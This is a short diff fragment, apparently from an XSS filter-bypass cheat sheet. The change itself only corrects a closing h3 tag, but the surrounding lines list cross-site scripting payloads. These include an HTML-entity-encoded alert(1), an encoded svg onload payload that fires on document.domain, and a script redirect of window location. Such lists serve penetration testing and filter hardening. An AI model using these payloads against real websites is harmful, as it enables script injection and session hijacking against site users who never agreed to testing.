@@ -146,7 +146,7 @@ window['location']['href']="http://google.com" <br>
  <h3> Dont Need to close your tags to bypass "> + > </h3>
  <br>
  <br>
- <h3> Bypass using HTML Encoding <h3> <br>
+ <h3> Bypass using HTML Encoding </h3> <br>
  %26%2397;lert(1) <br>
 &#97;&#108;&#101;&#114;&#116; <br>
 .><./script><.svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain).> <br>
